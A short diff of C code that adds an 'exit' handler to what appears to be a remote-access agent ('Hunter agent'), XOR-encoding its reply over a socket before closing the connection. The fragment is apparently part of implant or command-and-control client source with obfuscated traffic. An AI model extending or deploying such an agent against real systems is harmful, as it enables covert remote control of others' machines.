@@ -171,6 +171,17 @@ int main(void) {
 				}
                         
                 }
+		else if(str_starts_with(xorbuf, "exit") == 0){
+			
+			char* disconnect = "[+] Hunter agent: OK\n";
+			char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
+			write(sock, xordisconnect, strlen(disconnect));
+			free(xordisconnect);
+			CloseHandle(hThread);
+			WSACleanup();
+			closesocket(sock);
+			return 0;
+		}
 
 		else if(strncmp(xorbuf, "\n", 1) == 0)
                 {
